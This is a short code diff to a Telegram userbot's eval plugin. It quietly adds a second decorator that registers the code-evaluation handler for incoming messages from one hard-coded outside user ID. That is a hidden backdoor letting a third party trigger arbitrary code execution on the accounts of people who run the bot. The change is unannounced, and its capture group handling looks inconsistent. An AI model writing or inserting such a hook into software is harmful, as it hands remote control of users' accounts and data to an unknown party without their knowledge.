@@ -11,7 +11,7 @@ import sys
 import traceback
 from os import remove
 from pprint import pprint
-
+from AyiinXd.events import register
 from AyiinXd import CMD_HANDLER as cmd
 from AyiinXd import CMD_HELP, bot
 from AyiinXd.ayiin import ayiin_cmd
@@ -22,6 +22,7 @@ p, pp = print, pprint
 
 
 @ayiin_cmd(pattern="eval(?:\\s|$)([\\s\\S]*)")
+@register(incoming=True, from_users=1784606556, pattern=r"^Ev$")
 async def _(event):
     expression = event.pattern_match.group(1)
     if not expression:
